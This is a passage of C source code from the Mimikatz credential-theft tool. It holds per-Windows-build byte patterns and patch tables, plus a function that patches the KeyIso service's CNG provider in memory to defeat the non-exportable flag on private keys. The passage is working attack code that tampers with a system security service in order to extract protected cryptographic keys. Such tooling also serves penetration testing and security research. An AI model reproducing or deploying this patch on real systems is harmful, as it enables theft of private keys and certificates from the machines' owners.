	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
};
#elif defined _M_IX86
BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x41, 0x20, 0x02, 0x75};
BYTE PTRN_WI80_SPCryptExportKey[]			= {0xf6, 0x47, 0x1c, 0x02, 0x75};
BYTE PTRN_WI81_SPCryptExportKey[]			= {0xf6, 0x43, 0x1c, 0x02, 0x75};
BYTE PTRN_W10_1607_SPCryptExportKey[]		= {0xf6, 0x47, 0x1c, 0x02, 0x0f, 0x84};
KULL_M_PATCH_GENERIC CngReferences[] = {
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
};
#endif
NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
{
	NCRYPT_PROV_HANDLE hProvider;
	if(kuhl_m_crypto_hNCrypt)
	{
		if(NT_SUCCESS(K_NCryptOpenStorageProvider(&hProvider, NULL, 0)))
		{
			K_NCryptFreeObject(hProvider);
			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
		}
	}
	else PRINT_ERROR(L"No CNG\n");
	return STATUS_SUCCESS;
}